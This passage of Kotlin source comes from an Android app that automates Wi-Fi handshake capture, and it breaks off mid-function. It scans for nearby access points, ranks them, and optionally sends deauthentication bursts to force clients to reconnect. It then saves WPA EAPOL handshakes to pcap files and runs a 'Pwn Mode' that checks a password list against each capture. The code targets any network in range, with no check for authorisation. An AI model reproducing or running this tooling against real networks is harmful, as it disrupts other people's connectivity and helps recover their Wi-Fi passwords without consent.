package com.swp81x.nrsuite

import com.swp81x.nrsuite.core.handshake.AutoHandshakeAttempt
import com.swp81x.nrsuite.core.handshake.CapturedHandshakeEntry
import com.swp81x.nrsuite.core.handshake.CrackSource
import com.swp81x.nrsuite.core.handshake.HandshakeCrackStatus
import com.swp81x.nrsuite.core.handshake.PwnModeState
import com.swp81x.nrsuite.core.handshake.PwnModeStore
import com.swp81x.nrsuite.core.handshake.AutoHandshakeConfig
import com.swp81x.nrsuite.core.handshake.AutoHandshakeFeedEntry
import com.swp81x.nrsuite.core.handshake.AutoHandshakePhase
import com.swp81x.nrsuite.core.handshake.AutoHandshakeRanker
import com.swp81x.nrsuite.core.handshake.AutoHandshakeSession
import com.swp81x.nrsuite.core.handshake.AutoHandshakeSessionStore
import com.swp81x.nrsuite.core.handshake.AutoHandshakeStats
import com.swp81x.nrsuite.core.handshake.AutoHandshakeTarget
import com.swp81x.nrsuite.core.handshake.AutoHandshakeTargetStatus
import com.swp81x.nrsuite.core.handshake.AutoHandshakeUiState
import com.swp81x.nrsuite.core.handshake.HandshakeProgress
import com.swp81x.nrsuite.core.history.HistoryLevel
import com.swp81x.nrsuite.core.log.LogLevel
import com.swp81x.nrsuite.core.pcap.PcapWriter
import com.swp81x.nrsuite.core.session.ConnectionState
import com.swp81x.nrsuite.core.session.NrSession
import com.swp81x.nrsuite.core.wifi.bandForWifiChannel
import com.swp81x.nrsuite.core.wifi.normalizeWifiChannel
import com.swp81x.nrsuite.core.wifi.NetworkTarget
import com.swp81x.nrsuite.core.wpa.WpaHandshake
import com.swp81x.nrsuite.core.wpa.WpaHandshakeTracker
import com.swp81x.nrsuite.core.wpa.WpaHandshakeVerifier
import androidx.core.content.FileProvider
import java.io.File
import java.time.LocalDate
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicLong
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.NonCancellable
import kotlinx.coroutines.cancelAndJoin
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject

internal class AutoHandshakeRuntime {
    val uiState = MutableStateFlow(AutoHandshakeUiState())
    val sessions = MutableStateFlow<List<AutoHandshakeSession>>(emptyList())
    val feed = MutableStateFlow<List<AutoHandshakeFeedEntry>>(emptyList())
    val pwnMode = MutableStateFlow(PwnModeState())
    val captures = MutableStateFlow<List<CapturedHandshakeEntry>>(emptyList())

    var job: Job? = null
    var pcapJob: Job? = null
    var pcapWriter: PcapWriter? = null
    var currentSession: AutoHandshakeSession? = null
    var currentTarget: AutoHandshakeTarget? = null
    var currentTempFile: File? = null
    var pendingCrackerCapture: CapturedHandshakeEntry? = null
    var stopRequested: Boolean = false
    var stopInProgress: Boolean = false

    var currentAttemptStartedAtMs: Long = 0L
    var currentPacketCount = AtomicLong(0L)
    var currentEapolCount = AtomicLong(0L)
    var currentDeauthBursts: Int = 0
    var currentM1: Boolean = false
    var currentM2: Boolean = false
    var currentValid: Boolean = false
    var currentClient: String? = null
    var currentBssid: String? = null

    var currentChannel: Int? = null
    var activeWriters: MutableMap<String, PcapWriter>? = null
    var activePcapJob: Job? = null
    var cycleHandshakeCount: Int = 0
    var cycleTargetCount: Int = 0
    var reactionFace: String = "-_-"
    var reactionPhrase: String = "Ready."
}

private val AUTOHANDSHAKE_ACTIVE_PHASES = setOf(
    AutoHandshakePhase.RECON,
    AutoHandshakePhase.INTERACT,
    AutoHandshakePhase.SCANNING,
    AutoHandshakePhase.SURVEYING,
    AutoHandshakePhase.RANKING,
    AutoHandshakePhase.TARGET_READY,
    AutoHandshakePhase.CAPTURING,
    AutoHandshakePhase.DEAUTH_ASSIST,
    AutoHandshakePhase.HANDSHAKE_FOUND,
    AutoHandshakePhase.SAVING,
    AutoHandshakePhase.STOPPING,
)

private fun MainViewModel.autoHandshakeStore(): AutoHandshakeSessionStore =
    AutoHandshakeSessionStore(File(app.filesDir, "AutoHandshake"))

private fun MainViewModel.pwnModeStore(): PwnModeStore =
    PwnModeStore(File(app.filesDir, "AutoHandshake"))

internal fun MainViewModel.loadAutoHandshakeSessionsImpl() {
    val store = autoHandshakeStore()
    val loaded = runCatching { store.loadSessions() }.getOrDefault(emptyList())
    val normalized = loaded
        .map { session ->
            if (session.state in AUTOHANDSHAKE_ACTIVE_PHASES) {
                session.copy(state = AutoHandshakePhase.INTERRUPTED)
            } else {
                session
            }
        }
        .sortedByDescending { it.updatedAt }

    autoHandshake.sessions.value = normalized
    if (normalized != loaded) {
        runCatching { store.saveSessions(normalized) }
    }

    val today = LocalDate.now().toString()
    val loadedStats = runCatching { store.loadStats() }.getOrDefault(AutoHandshakeStats())
    val stats = if (loadedStats.statsDate == today) {
        loadedStats
    } else {
        loadedStats.copy(todayCaptures = 0, statsDate = today)
    }
    if (stats != loadedStats) {
        runCatching { store.saveStats(stats) }
    }

    autoHandshake.uiState.update { current ->
        current.copy(stats = stats)
    }

    val pwnStore = pwnModeStore()
    autoHandshake.pwnMode.value = runCatching { pwnStore.loadState() }.getOrDefault(PwnModeState())
    autoHandshake.captures.value = runCatching { pwnStore.loadCaptures() }.getOrDefault(emptyList())
}

private fun MainViewModel.addAutoHandshakeFeed(message: String, level: LogLevel = LogLevel.INFO) {
    val entry = AutoHandshakeFeedEntry(
        timestampMs = System.currentTimeMillis(),
        level = level,
        message = message,
    )
    autoHandshake.feed.update { (it + entry).takeLast(100) }
}

private fun MainViewModel.currentAutoHandshakeProgress(): HandshakeProgress {
    val runtime = autoHandshake
    val startedAt = runtime.currentAttemptStartedAtMs
    return HandshakeProgress(
        m1Found = runtime.currentM1,
        m2Found = runtime.currentM2,
        bssid = runtime.currentBssid ?: runtime.currentTarget?.target?.bssid,
        station = runtime.currentClient,
        valid = runtime.currentValid,
        packetCount = runtime.currentPacketCount.get(),
        eapolCount = runtime.currentEapolCount.get(),
        deauthBursts = runtime.currentDeauthBursts,
        elapsedMs = if (startedAt > 0L) System.currentTimeMillis() - startedAt else 0L,
    )
}

private const val REACTION_NBSP = "\u00A0"

private fun lookRight(base: String): String = "$REACTION_NBSP$REACTION_NBSP$base"
private fun lookLeft(base: String): String = "$base$REACTION_NBSP$REACTION_NBSP"
private fun lookCenter(base: String): String = base

private fun nrugochiMood(
    phase: AutoHandshakePhase,
    cycleHandshakeCount: Int,
    channel: Int?,
): Pair<String, String> = when {
    phase == AutoHandshakePhase.PAUSED -> lookCenter("z_z") to "Paused."
    phase == AutoHandshakePhase.STOPPING -> lookCenter("...") to "Stopping safely..."
    phase == AutoHandshakePhase.FAILED ||
        phase == AutoHandshakePhase.INTERRUPTED -> lookCenter("!_!") to "Needs attention."
    phase == AutoHandshakePhase.RECON ||
        phase == AutoHandshakePhase.SCANNING -> lookRight("o_o") to "Scanning channels..."
    phase == AutoHandshakePhase.INTERACT && cycleHandshakeCount > 0 ->
        lookCenter("*_*") to "Handshake locked."
    phase == AutoHandshakePhase.INTERACT ||
        phase == AutoHandshakePhase.CAPTURING ||
        phase == AutoHandshakePhase.DEAUTH_ASSIST -> {
        val face = if ((channel ?: 0) % 2 == 0) {
            lookLeft(">_<")
        } else {
            lookRight(">_<")
        }
        face to "Hunting handshakes..."
    }
    phase == AutoHandshakePhase.HANDSHAKE_FOUND ||
        phase == AutoHandshakePhase.SAVING -> lookCenter("*_*") to "Handshake captured."
    phase == AutoHandshakePhase.TARGET_READY -> lookLeft("-_-") to "Selecting next target..."
    else -> lookCenter("-_-") to "Ready."
}

private fun MainViewModel.publishAutoHandshake(
    phase: AutoHandshakePhase,
    session: AutoHandshakeSession? = autoHandshake.currentSession,
    target: AutoHandshakeTarget? = autoHandshake.currentTarget,
    error: String? = null,
    currentChannel: Int? = autoHandshake.currentChannel,
    cycleHandshakeCount: Int = autoHandshake.cycleHandshakeCount,
    cycleTargetCount: Int = autoHandshake.cycleTargetCount,
) {
    autoHandshake.currentSession = session
    autoHandshake.currentTarget = target
    autoHandshake.currentChannel = currentChannel
    autoHandshake.cycleHandshakeCount = cycleHandshakeCount
    autoHandshake.cycleTargetCount = cycleTargetCount
    val (face, phrase) = nrugochiMood(phase, cycleHandshakeCount, currentChannel)
    autoHandshake.reactionFace = face
    autoHandshake.reactionPhrase = phrase
    autoHandshake.uiState.update { current ->
        current.copy(
            running = phase in AUTOHANDSHAKE_ACTIVE_PHASES,
            phase = phase,
            session = session,
            targets = session?.targets ?: emptyList(),
            currentTarget = target,
            progress = currentAutoHandshakeProgress(),
            error = error,
            reactionFace = face,
            reactionPhrase = phrase,
            currentChannel = currentChannel,
            cycleHandshakeCount = cycleHandshakeCount,
            cycleTargetCount = cycleTargetCount,
        )
    }
}

private fun MainViewModel.saveAutoHandshakeSession(session: AutoHandshakeSession) {
    autoHandshake.currentSession = session
    val current = autoHandshake.sessions.value.toMutableList()
    val index = current.indexOfFirst { it.id == session.id }
    if (index >= 0) {
        current[index] = session
    } else {
        current.add(0, session)
    }
    autoHandshake.sessions.value = current
    runCatching { autoHandshakeStore().saveSessions(current) }
    autoHandshake.uiState.update { state ->
        state.copy(session = session, targets = session.targets)
    }
}

private fun MainViewModel.replaceAutoHandshakeTarget(
    session: AutoHandshakeSession,
    target: AutoHandshakeTarget,
): AutoHandshakeSession = session.copy(
    targets = session.targets.map {
        if (it.bssidKey == target.bssidKey) target else it
    },
    updatedAt = timestampNow(),
)

private fun MainViewModel.recordAutoHandshakeCapture(bssid: String) {
    val today = LocalDate.now().toString()
    val current = autoHandshake.uiState.value.stats
    val base = if (current.statsDate == today) {
        current
    } else {
        current.copy(todayCaptures = 0, statsDate = today)
    }
    val updated = base.copy(
        totalCaptures = base.totalCaptures + 1,
        todayCaptures = base.todayCaptures + 1,
        statsDate = today,
        lastCapturedAt = timestampNow(),
        lastBssid = bssid,
    )
    runCatching { autoHandshakeStore().saveStats(updated) }
    autoHandshake.uiState.update { it.copy(stats = updated) }
}

private fun MainViewModel.savePwnModeState(state: PwnModeState) {
    autoHandshake.pwnMode.value = state
    runCatching { pwnModeStore().saveState(state) }
}

internal fun MainViewModel.setPwnModeEnabledImpl(enabled: Boolean) {
    val current = autoHandshake.pwnMode.value
    savePwnModeState(current.copy(enabled = enabled))
    addAutoHandshakeFeed(
        if (enabled) "Pwn Mode enabled." else "Pwn Mode disabled.",
        LogLevel.INFO,
    )
}

internal fun MainViewModel.addPwnPasswordImpl(password: String) {
    val clean = password.trim()
    if (clean.isEmpty()) return
    val current = autoHandshake.pwnMode.value
    if (current.passwords.size >= PwnModeStore.MAX_PASSWORDS) {
        addAutoHandshakeFeed(
            "Pwn Mode supports at most ${PwnModeStore.MAX_PASSWORDS} passwords.",
            LogLevel.ERROR,
        )
        return
    }
    if (current.passwords.any { it == clean }) return
    savePwnModeState(current.copy(passwords = current.passwords + clean))
    addAutoHandshakeFeed("Pwn Mode password added (${current.passwords.size + 1}).")
}

internal fun MainViewModel.removePwnPasswordImpl(password: String) {
    val current = autoHandshake.pwnMode.value
    val updated = current.passwords.filterNot { it == password }
    if (updated.size == current.passwords.size) return
    savePwnModeState(current.copy(passwords = updated))
    addAutoHandshakeFeed("Pwn Mode password removed (${updated.size} remaining).")
}

private fun MainViewModel.refreshCapturedHandshakes() {
    autoHandshake.captures.value = runCatching {
        pwnModeStore().loadCaptures()
    }.getOrDefault(emptyList())
}

private fun MainViewModel.capturedMacKeys(): Set<String> =
    autoHandshake.captures.value
        .map { it.bssid.uppercase().replace(":", "") }
        .toSet()

internal fun MainViewModel.resetNrugochiStatsImpl() {
    val today = LocalDate.now().toString()
    val reset = AutoHandshakeStats(statsDate = today)
    autoHandshake.uiState.update { it.copy(stats = reset) }
    runCatching { autoHandshakeStore().saveStats(reset) }
    addAutoHandshakeFeed("Capture statistics reset.")
}

private suspend fun MainViewModel.checkPwnModeForCapture(
    handshake: WpaHandshake?,
    ssid: String,
    entry: CapturedHandshakeEntry,
) {
    val state = autoHandshake.pwnMode.value
    if (!state.enabled || state.passwords.isEmpty()) return
    if (handshake == null || ssid.isBlank()) {
        addAutoHandshakeFeed(
            "Pwn Mode skipped ${entry.bssid}: missing handshake material or SSID.",
            LogLevel.INFO,
        )
        return
    }

    val match = withContext(Dispatchers.Default) {
        state.passwords.firstOrNull { password ->
            runCatching {
                WpaHandshakeVerifier.verify(handshake, ssid, password)
            }.getOrDefault(false)
        }
    }

    val updated = if (match != null) {
        entry.copy(
            status = HandshakeCrackStatus.CRACKED,
            password = match,
            crackSource = CrackSource.PWN_MODE,
        )
    } else {
        entry.copy(status = HandshakeCrackStatus.FAILED)
    }
    runCatching { pwnModeStore().upsertCapture(updated) }
    refreshCapturedHandshakes()
    addAutoHandshakeFeed(
        if (match != null) {
            "Pwn Mode cracked ${entry.bssid}."
        } else {
            "Pwn Mode checked ${entry.bssid}: no match."
        },
        if (match != null) LogLevel.SUCCESS else LogLevel.INFO,
    )
}

internal fun MainViewModel.deleteCapturedHandshakeImpl(entry: CapturedHandshakeEntry) {
    runCatching { pwnModeStore().deleteCapture(entry) }
    refreshCapturedHandshakes()
    addAutoHandshakeFeed("Deleted ${entry.pcapPath.substringAfterLast('/')}.")
}

internal fun MainViewModel.clearPendingNrugochiCaptureImpl() {
    autoHandshake.pendingCrackerCapture = null
}

internal fun MainViewModel.openCaptureInCrackerImpl(entry: CapturedHandshakeEntry) {
    val file = File(entry.pcapPath)
    if (!file.exists()) {
        addAutoHandshakeFeed("Capture file no longer exists: ${entry.pcapPath}", LogLevel.ERROR)
        return
    }
    val uri = runCatching {
        FileProvider.getUriForFile(app, "${app.packageName}.fileprovider", file)
    }.getOrNull()
    if (uri == null) {
        addAutoHandshakeFeed("Could not expose capture to WPA Cracker.", LogLevel.ERROR)
        return
    }
    this.setCrackerCustomPcapImpl(uri, file.name)
    autoHandshake.pendingCrackerCapture = entry
}

internal fun MainViewModel.persistNrugochiCrackResultImpl(password: String) {
    val pending = autoHandshake.pendingCrackerCapture ?: return
    val updated = pending.copy(
        status = HandshakeCrackStatus.CRACKED,
        password = password,
        crackSource = CrackSource.WPA_CRACKER,
    )
    runCatching { pwnModeStore().upsertCapture(updated) }
    refreshCapturedHandshakes()
    autoHandshake.pendingCrackerCapture = null
    addAutoHandshakeFeed("WPA Cracker cracked ${pending.bssid}.", LogLevel.SUCCESS)
}

internal fun MainViewModel.markNrugochiCrackFailedImpl() {
    val pending = autoHandshake.pendingCrackerCapture ?: return
    val updated = pending.copy(
        status = HandshakeCrackStatus.FAILED,
        password = null,
        crackSource = null,
    )
    runCatching { pwnModeStore().upsertCapture(updated) }
    refreshCapturedHandshakes()
    autoHandshake.pendingCrackerCapture = null
    addAutoHandshakeFeed("WPA Cracker checked ${pending.bssid}: no match.")
}

internal fun MainViewModel.startAutoHandshakeImpl(config: AutoHandshakeConfig) {
    val activeSession = session
    if (activeSession == null) {
        appendLog("Connect to a device before starting NRuGochi.")
        return
    }
    if (autoHandshake.job?.isActive == true) return
    if (!ensureRadioIdle("NRuGochi")) return
    stopLocalPortalImpl()

    autoHandshake.stopRequested = false
    autoHandshake.stopInProgress = false
    autoHandshake.feed.value = emptyList()
    autoHandshake.currentPacketCount = AtomicLong(0L)
    autoHandshake.currentEapolCount = AtomicLong(0L)
    autoHandshake.currentDeauthBursts = 0
    autoHandshake.currentM1 = false
    autoHandshake.currentM2 = false
    autoHandshake.currentValid = false
    autoHandshake.currentClient = null
    autoHandshake.currentBssid = null
    autoHandshake.currentChannel = null
    autoHandshake.cycleHandshakeCount = 0
    autoHandshake.cycleTargetCount = 0

    val connected = activeSession.state.value as? ConnectionState.Connected
    val model = AutoHandshakeSession(
        id = System.currentTimeMillis().toString(),
        createdAt = timestampNow(),
        updatedAt = timestampNow(),
        deviceId = connected?.deviceId,
        state = AutoHandshakePhase.RECON,
        config = config,
    )
    autoHandshakeStore().ensureDirs()
    autoHandshake.currentSession = model
    saveAutoHandshakeSession(model)
    publishAutoHandshake(AutoHandshakePhase.RECON, model, null)
    addAutoHandshakeFeed("NRuGochi session started.")
    appendLog("NRuGochi started.")
    addHistory("nrugochi", "NRuGochi session started", HistoryLevel.INFO)
    updateForegroundService()

    autoHandshake.job = scope.launch {
        runNrugochiLoop(activeSession, model)
    }
}

internal fun MainViewModel.stopAutoHandshakeImpl() {
    if (autoHandshake.stopInProgress) return
    if (autoHandshake.job == null && !autoHandshake.uiState.value.running) return

    autoHandshake.stopInProgress = true
    autoHandshake.stopRequested = true

    val activeJob = autoHandshake.job
    val stopping = autoHandshake.currentSession?.copy(
        state = AutoHandshakePhase.STOPPING,
        updatedAt = timestampNow(),
    )
    if (stopping != null) {
        saveAutoHandshakeSession(stopping)
        publishAutoHandshake(AutoHandshakePhase.STOPPING, stopping, null)
    }

    if (activeJob != null && activeJob.isActive) {
        // Let runNrugochiLoop's finally block perform one cleanup pass.
        activeJob.cancel()
        // Watchdog: if the worker never reaches PAUSED, force the UI and
        // transport back into a stable state instead of remaining at STOPPING.
        scope.launch {
            delay(6_000L)
            if (!autoHandshake.stopInProgress) return@launch
            val activeSession = session
            withContext(NonCancellable + Dispatchers.IO) {
                stopAutoHandshakeRadio(activeSession)
            }
            val forced = autoHandshake.currentSession?.copy(
                state = AutoHandshakePhase.PAUSED,
                updatedAt = timestampNow(),
            )
            if (forced != null) {
                saveAutoHandshakeSession(forced)
                publishAutoHandshake(AutoHandshakePhase.PAUSED, forced, null)
            }
            addAutoHandshakeFeed("Stop watchdog recovered the NRuGochi state.")
            autoHandshake.job = null
            autoHandshake.stopInProgress = false
            updateForegroundService()
        }
        return
    }

    // No active worker: perform a single cleanup pass here.
    val activeSession = session
    scope.launch {
        withContext(NonCancellable + Dispatchers.IO) {
            stopAutoHandshakeRadio(activeSession)
        }
        val paused = autoHandshake.currentSession?.copy(
            state = AutoHandshakePhase.PAUSED,
            updatedAt = timestampNow(),
        )
        if (paused != null) {
            saveAutoHandshakeSession(paused)
            publishAutoHandshake(AutoHandshakePhase.PAUSED, paused, null)
        }
        addAutoHandshakeFeed("NRuGochi stopped by user.")
        autoHandshake.stopInProgress = false
        updateForegroundService()
    }
}

internal fun MainViewModel.resumeAutoHandshakeImpl(sessionId: String) {
    val activeSession = session
    if (activeSession == null) {
        appendLog("Connect to a device before resuming NRuGochi.")
        return
    }
    if (autoHandshake.job?.isActive == true) return
    if (!ensureRadioIdle("NRuGochi")) return

    val stored = autoHandshake.sessions.value.firstOrNull { it.id == sessionId } ?: run {
        appendLog("NRuGochi session not found.")
        return
    }

    autoHandshake.stopRequested = false
    autoHandshake.stopInProgress = false
    autoHandshake.feed.value = emptyList()
    autoHandshake.currentPacketCount = AtomicLong(0L)
    autoHandshake.currentEapolCount = AtomicLong(0L)
    autoHandshake.currentDeauthBursts = 0
    autoHandshake.currentM1 = false
    autoHandshake.currentM2 = false
    autoHandshake.currentValid = false
    autoHandshake.currentClient = null
    autoHandshake.currentBssid = null
    autoHandshake.currentChannel = null
    autoHandshake.cycleHandshakeCount = 0
    autoHandshake.cycleTargetCount = 0

    val resumed = stored.copy(
        state = AutoHandshakePhase.RECON,
        updatedAt = timestampNow(),
        lastError = null,
    )
    saveAutoHandshakeSession(resumed)
    publishAutoHandshake(AutoHandshakePhase.RECON, resumed, null)
    addAutoHandshakeFeed("Resuming NRuGochi session ${resumed.id}.")
    updateForegroundService()

    autoHandshake.job = scope.launch {
        runNrugochiLoop(activeSession, resumed)
    }
}

internal fun MainViewModel.deleteAutoHandshakeSessionImpl(sessionId: String) {
    val removed = autoHandshake.sessions.value.firstOrNull { it.id == sessionId } ?: return
    val remaining = autoHandshake.sessions.value.filterNot { it.id == sessionId }
    autoHandshake.sessions.value = remaining
    runCatching { autoHandshakeStore().saveSessions(remaining) }

    removed.targets.forEach { target ->
        runCatching { autoHandshakeStore().deleteCaptureFile(target.target.bssid) }
    }
    if (autoHandshake.currentSession?.id == sessionId) {
        autoHandshake.currentSession = null
        autoHandshake.currentTarget = null
        publishAutoHandshake(AutoHandshakePhase.IDLE, null, null)
    }
}

internal fun MainViewModel.clearAutoHandshakeSessionsImpl() {
    val all = autoHandshake.sessions.value
    all.forEach { session ->
        session.targets.forEach { target ->
            runCatching { autoHandshakeStore().deleteCaptureFile(target.target.bssid) }
        }
    }
    autoHandshake.sessions.value = emptyList()
    runCatching { autoHandshakeStore().saveSessions(emptyList()) }
    autoHandshake.currentSession = null
    autoHandshake.currentTarget = null
    publishAutoHandshake(AutoHandshakePhase.IDLE, null, null)
}

private suspend fun MainViewModel.runNrugochiLoop(
    activeSession: NrSession,
    seed: AutoHandshakeSession,
) {
    var model = seed
    try {
        while (!autoHandshake.stopRequested) {
            if (activeSession.state.value !is ConnectionState.Connected) {
                model = model.copy(
                    state = AutoHandshakePhase.INTERRUPTED,
                    updatedAt = timestampNow(),
                    lastError = "USB device disconnected",
                )
                saveAutoHandshakeSession(model)
                addAutoHandshakeFeed("Device disconnected; session marked interrupted.", LogLevel.ERROR)
                return
            }

            model = runNrugochiRecon(activeSession, model)
            if (autoHandshake.stopRequested) break
            if (model.state == AutoHandshakePhase.INTERRUPTED ||
                model.state == AutoHandshakePhase.FAILED
            ) {
                break
            }

            val supportedAps = model.targets
                .asSequence()
                .filter { it.inRange }
                .map { it.target }
                .filter { AutoHandshakeRanker.isSupportedSecurity(it.security) }
                .toList()

            val byChannel = supportedAps.groupBy { it.channel }
            val channels = if (model.config.allChannels) {
                byChannel.keys.sortedByDescending { byChannel[it]?.size ?: 0 }
            } else {
                listOf(1, 6, 11).filter { byChannel.containsKey(it) }
                    .sortedByDescending { byChannel[it]?.size ?: 0 }
            }

            if (channels.isEmpty()) {
                addAutoHandshakeFeed("No eligible APs found in this cycle.")
                delay(model.config.rescanDelayMs)
                continue
            }

            val attemptsThisCycle = mutableMapOf<String, Int>()
            var cycleHandshakes = 0

            for (channel in channels) {
                if (autoHandshake.stopRequested) break
                val channelAps = byChannel[channel].orEmpty()
                    .sortedByDescending { it.rssi }
                if (channelAps.isEmpty()) continue

                val result = interactNrugochiChannel(
                    activeSession = activeSession,
                    model = model,
                    channel = channel,
                    channelAps = channelAps,
                    attemptsThisCycle = attemptsThisCycle,
                    deauthEnabled = model.config.deauthAssist,
                )
                model = result.session
                cycleHandshakes += result.handshakes
                if (model.state == AutoHandshakePhase.INTERRUPTED ||
                    model.state == AutoHandshakePhase.FAILED
                ) {
                    break
                }
            }

            autoHandshake.cycleHandshakeCount = cycleHandshakes
            autoHandshake.cycleTargetCount = supportedAps.size
            publishAutoHandshake(
                phase = if (model.state == AutoHandshakePhase.INTERRUPTED ||
                    model.state == AutoHandshakePhase.FAILED
                ) {
                    model.state
                } else {
                    AutoHandshakePhase.RECON
                },
                session = model,
                currentChannel = null,
                cycleHandshakeCount = cycleHandshakes,
                cycleTargetCount = supportedAps.size,
            )

            if (model.state == AutoHandshakePhase.INTERRUPTED ||
                model.state == AutoHandshakePhase.FAILED
            ) {
                break
            }

            addAutoHandshakeFeed("Re-scanning in ${model.config.rescanDelayMs}ms.")
            delay(model.config.rescanDelayMs)
        }
    } catch (cancelled: CancellationException) {
        throw cancelled
    } catch (error: Throwable) {
        model = model.copy(
            state = AutoHandshakePhase.FAILED,
            updatedAt = timestampNow(),
            lastError = error.message ?: error.javaClass.simpleName,
        )
        saveAutoHandshakeSession(model)
        publishAutoHandshake(AutoHandshakePhase.FAILED, model, null, model.lastError)
        addAutoHandshakeFeed("NRuGochi failed: ${model.lastError}", LogLevel.ERROR)
    } finally {
        withContext(NonCancellable + Dispatchers.IO) {
            stopAutoHandshakeRadio(activeSession)
        }
        val finalState = when {
            autoHandshake.stopRequested -> AutoHandshakePhase.PAUSED
            model.state == AutoHandshakePhase.INTERRUPTED -> AutoHandshakePhase.INTERRUPTED
            model.state == AutoHandshakePhase.FAILED -> AutoHandshakePhase.FAILED
            else -> model.state
        }
        model = model.copy(state = finalState, updatedAt = timestampNow())
        saveAutoHandshakeSession(model)
        publishAutoHandshake(finalState, model, null, model.lastError)
        autoHandshake.job = null
        autoHandshake.stopInProgress = false
        addAutoHandshakeFeed("NRuGochi stopped.")
        updateForegroundService()
    }
}

private suspend fun MainViewModel.runNrugochiRecon(
    activeSession: NrSession,
    model: AutoHandshakeSession,
): AutoHandshakeSession {
    publishAutoHandshake(
        phase = AutoHandshakePhase.RECON,
        session = model,
        currentChannel = null,
        cycleHandshakeCount = autoHandshake.cycleHandshakeCount,
        cycleTargetCount = autoHandshake.cycleTargetCount,
    )
    addAutoHandshakeFeed("Scanning for APs...")

    val scan = collectAutoHandshakeScan(activeSession, model.config.scanTimeoutMs)
    if (scan.commandResult == null || scan.commandResult < 0) {
        val message = "Scan failed; resetting radio and retrying."
        addAutoHandshakeFeed(message, LogLevel.ERROR)
        runCatching { activeSession.sendCommand("STOP_ALL", timeoutMs = 5_000) }
        val failed = model.copy(
            state = AutoHandshakePhase.RECON,
            updatedAt = timestampNow(),
            lastError = message,
        )
        saveAutoHandshakeSession(failed)
        publishAutoHandshake(AutoHandshakePhase.RECON, failed, null, message)
        return failed
    }

    val aps = scan.aps
    addAutoHandshakeFeed("Scan found ${aps.size} AP(s).")

    if (activeSession.state.value !is ConnectionState.Connected) {
        return model.copy(
            state = AutoHandshakePhase.INTERRUPTED,
            updatedAt = timestampNow(),
            lastError = "USB device disconnected",
        )
    }

    val targets = AutoHandshakeRanker.refresh(
        history = model.targets,
        aps = aps,
        clients = emptyList(),
        config = model.config,
        nowMs = System.currentTimeMillis(),
    )
    val updated = model.copy(
        targets = targets,
        state = AutoHandshakePhase.RECON,
        updatedAt = timestampNow(),
        lastError = null,
    )
    saveAutoHandshakeSession(updated)
    return updated
}

private data class NrugochiScanResult(
    val commandResult: Int?,
    val aps: List<NetworkTarget>,
)

private data class NrugochiChannelResult(
    val session: AutoHandshakeSession,
    val handshakes: Int,
)

private suspend fun MainViewModel.interactNrugochiChannel(
    activeSession: NrSession,
    model: AutoHandshakeSession,
    channel: Int,
    channelAps: List<NetworkTarget>,
    attemptsThisCycle: MutableMap<String, Int>,
    deauthEnabled: Boolean,
): NrugochiChannelResult {
    val targetsByBssid = model.targets.associateBy { it.bssidKey }
    val capturedMacs = if (model.config.skipCapturedMacs) capturedMacKeys() else emptySet()
    val eligible = channelAps.mapNotNull { ap ->
        val target = targetsByBssid[ap.bssid.uppercase().replace(":", "")]
        if (target == null) return@mapNotNull null
        if (!target.inRange || target.status == AutoHandshakeTargetStatus.CAPTURED) return@mapNotNull null
        if (target.bssidKey in capturedMacs) return@mapNotNull null
        val attempts = attemptsThisCycle[target.bssidKey] ?: 0
        if (attempts >= model.config.maxApAttemptsPerCycle) return@mapNotNull null
        target
    }

    if (eligible.isEmpty()) {
        return NrugochiChannelResult(model, autoHandshake.cycleHandshakeCount)
    }

    autoHandshake.currentChannel = channel
    autoHandshake.cycleTargetCount = eligible.size
    autoHandshake.currentPacketCount = AtomicLong(0L)
    autoHandshake.currentEapolCount = AtomicLong(0L)
    autoHandshake.currentDeauthBursts = if (deauthEnabled) model.config.deauthFramesPerAp else 0
    autoHandshake.currentM1 = false
    autoHandshake.currentM2 = false
    autoHandshake.currentValid = false
    autoHandshake.currentClient = null
    autoHandshake.currentBssid = null
    autoHandshake.currentAttemptStartedAtMs = System.currentTimeMillis()

    val store = autoHandshakeStore()
    store.ensureDirs()
    val knownBssids = channelAps.map { it.bssid.uppercase() }.toSet()
    val eligibleBssids = eligible.map { it.target.bssid.uppercase() }.toSet()
    val writers = mutableMapOf<String, PcapWriter>()
    val packetCounts = mutableMapOf<String, Long>()
    val validBssids = ConcurrentHashMap.newKeySet<String>()
    val completedHandshakes = ConcurrentHashMap<String, WpaHandshake>()
    val tracker = WpaHandshakeTracker()

    publishAutoHandshake(
        phase = AutoHandshakePhase.INTERACT,
        session = model,
        target = eligible.first(),
        currentChannel = channel,
        cycleHandshakeCount = validBssids.size,
        cycleTargetCount = eligible.size,
    )
    addAutoHandshakeFeed(
        if (deauthEnabled) {
            "Channel $channel: deauthing ${eligible.size} AP(s), then capturing EAPOL."
        } else {
            "Channel $channel: passive EAPOL capture for ${eligible.size} AP(s)."
        },
    )

    val pcapJob = scope.launch(Dispatchers.IO) {
        activeSession.pcap.collect { frame ->
            if (autoHandshake.stopRequested) return@collect
            val bssid = resolveNrugochiBssid(frame, knownBssids) ?: return@collect
            val writer = writers.getOrPut(bssid) {
                runCatching { PcapWriter(store.partialCaptureFile(bssid)) }.getOrNull()
                    ?: return@collect
            }
            runCatching { writer.writePacket(frame) }
                .onFailure { appendLog("NRuGochi PCAP write error: ${it.message}", LogLevel.ERROR) }
            packetCounts[bssid] = (packetCounts[bssid] ?: 0L) + 1L
            autoHandshake.currentPacketCount.incrementAndGet()
            if (isNrugochiEapolFrame(frame)) {
                autoHandshake.currentEapolCount.incrementAndGet()
            }

            val update = runCatching { tracker.onFrame(frame) }.getOrNull() ?: return@collect
            if (update.completeHandshake != null && update.bssid != null) {
                val validKey = update.bssid.uppercase()
                validBssids.add(validKey)
                completedHandshakes[validKey] = update.completeHandshake
                autoHandshake.currentValid = true
                autoHandshake.currentM1 = true
                autoHandshake.currentM2 = true
                autoHandshake.currentBssid = validKey
                autoHandshake.cycleHandshakeCount = validBssids.size
                publishAutoHandshake(
                    phase = AutoHandshakePhase.INTERACT,
                    session = autoHandshake.currentSession,
                    target = autoHandshake.currentTarget,
                    currentChannel = channel,
                    cycleHandshakeCount = validBssids.size,
                    cycleTargetCount = eligible.size,
                )
            }
        }
    }
    autoHandshake.pcapJob = pcapJob
    autoHandshake.activePcapJob = pcapJob
    autoHandshake.activeWriters = writers

